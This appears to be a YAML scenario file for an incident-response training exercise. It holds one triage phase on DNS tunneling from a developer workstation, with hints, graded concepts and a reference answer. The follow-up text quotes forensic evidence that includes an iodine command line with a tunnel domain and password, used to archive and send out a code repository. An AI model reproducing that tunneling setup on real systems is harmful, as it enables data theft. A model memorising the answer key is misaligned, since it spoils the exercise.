phases:
- id: dns_anomaly_detection
  phase_type: triage
  title: Phase 1 — DNS Anomaly Detection
  situation: Zeek DNS logs show dev-ws-047 (10.10.50.47) has been sending TXT queries to t.data.tunnelcorp.net at 5,380/hour since Nov 30. Each query subdomain label is 40–55 characters of base32-encoded data. Your DNS sinkhole has not flagged this because tunnelcorp.net is not on any blocklist. The NS record for tunnelcorp.net points to 185.199.108.153 (Hetzner). You have never seen this domain in your environment before. The query pattern is clearly DNS tunneling.
  prompt: What is your first response?
  guidance:
    what: 'Separate signal from noise: confirm the alert on dev-ws-047, its severity, and the affected accounts.'
    action: What is your first response?
    why: Rapid scoping decides everything downstream — triage is where containment starts.
  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Phase 1 — DNS Anomaly Detection. Asset in scope: dev-ws-047.'
  hints:
  - Consider pulling the relevant logs for the affected window.
  - Think about which accounts or assets could be affected.
  ideal_concepts:
  - immediately block
  - tunnelcorp net
  - net dns
  - dns resolver
  - resolver pi-hole
  - pi-hole infoblox
  - infoblox add
  - hetzner firewall
  reference_answer: |-
    Immediately block tunnelcorp.net at the DNS resolver (Pi-hole or Infoblox), add the Hetzner NS IP to the firewall blocklist, then isolate dev-ws-047 from the network for forensic analysis while preserving memory and disk evidence.

    Why: Blocking at DNS stops ongoing exfiltration immediately. Isolating the host preserves volatile evidence (running iodine process, network connections) while preventing further data loss. This is the correct sequence: contain first, then investigate.
  followup_good: dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
  followup_weak: |-
    Blocking at DNS stops ongoing exfiltration immediately.

    dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
